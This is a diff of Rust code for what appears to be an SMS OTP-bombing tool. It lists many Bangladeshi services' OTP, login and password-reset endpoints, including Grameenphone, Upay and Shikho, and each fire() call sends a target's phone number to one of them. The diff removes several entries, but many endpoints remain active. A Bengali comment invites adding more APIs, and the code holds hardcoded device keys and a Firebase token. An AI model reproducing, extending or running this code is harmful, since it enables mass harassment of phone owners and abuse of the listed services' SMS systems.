@@ -132,18 +132,8 @@ fire("Apex4u",
     "https://api.apex4u.com/api/auth/login",
     json!({"phoneNumber": &number})
 ),
-fire("Easy.com.bd",
-    "https://core.easy.com.bd/api/v1/forgot-password-otp",
-    json!({"device_key": "2ea97d276a980993308116baa292cec9", "mobile": &number})
-),
-fire("Chardike",
-    "https://api.chardike.com/api/otp/send",
-    json!({"phone": &number, "otp_type": "login"})
-),
-fire("BTCL",
-    "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json",
-    json!({"phoneNbr": &number, "OTPType": 1, "userName": "", "email": ""})
-),
+
+
 fire("AWS POC",
     "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send",
     json!({"phone": &number})
@@ -164,14 +154,7 @@ fire("GP MyGP",
     "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp",
     json!({"mobileNumber": &number})
 ),
-fire("Garibook",
-    "https://api.garibookadmin.com/api/v3/user/login",
-    json!({"recaptcha_token": "garibookcaptcha", "mobile": &number, "channel": "web"})
-),
-fire("Bioscope Live",
-    "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
-    json!({"number": &plus_bd})
-),
+
 fire("Upay",
     "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
     json!({"wallet_number": &number, "geo_location": {"lat": 23.8979093, "long": 89.1356346}, "referral": "", "firebase_token": "e7XC0AWRR5C6rGMm6yCaZ8:APA91bHnbvs1bA_qXXb55W9GmsKmuzAUkgaR770HBH9hZCLjFV6HCejAsRGggvnD7c5dv2q_pOAdwY1peeTlzzn49cjPESTZ0NdR-bIhwe9_6of6rosH0AI", "device_uuid": "c65m117a8cbf5b1851b29f8b", "mno": "Robi"})
@@ -192,10 +175,7 @@ fire("Bohubrihi",
     "https://bb-api.bohubrihi.com/public/activity/otp",
     json!({"phone": &number, "intent": "login"})
 ),
-fire("Timezone BD",
-    "https://backend.timezonebd.com/api/v1/user/otp-login",
-    json!({"phone": &number})
-),
+
 fire("GP Shop",
     "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
     json!({"phone": &number, "language": "en", "email": ""})
@@ -204,34 +184,18 @@ fire("Shikho",
     "https://api.shikho.com/public/activity/otp",
     json!({"phone": &number, "intent": "ap-discount-request"})
 ),
-fire("Ghoori Learning",
-    "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn",
-    json!({"mobile_no": &number})
-),
-fire("Ostad",
-    "https://api.ostad.app/api/v2/user/with-otp",
-    json!({"msisdn": &number})
-),
+
 fire("iEducation BD",
     "https://www.ieducationbd.com/api/account/check_user",
     json!({"mobile": &number})
 ),
-fire("Nexopet",
-    "https://host03pet.nexopet.com/api/v1.0/users/send-otp",
-    json!({"phone": &number})
-),
-fire("Bikroy",
-    "https://bikroy.com/data/phone_number_login/verifications/phone_login",
-    json!({"phone": &number})
-),
+
+
 fire("Bangladeshi Matrimony",
     "https://www.bangladeshimatrimony.com/register/editmobileno.php",
     json!({"mobileNo": &number})
 ),
-fire("Edge Course BD",
-    "https://edgecoursebd.com/register",
-    json!({"phone": &number})
-),
+
 
             
         // ── এখানে নতুন API যোগ করো ──
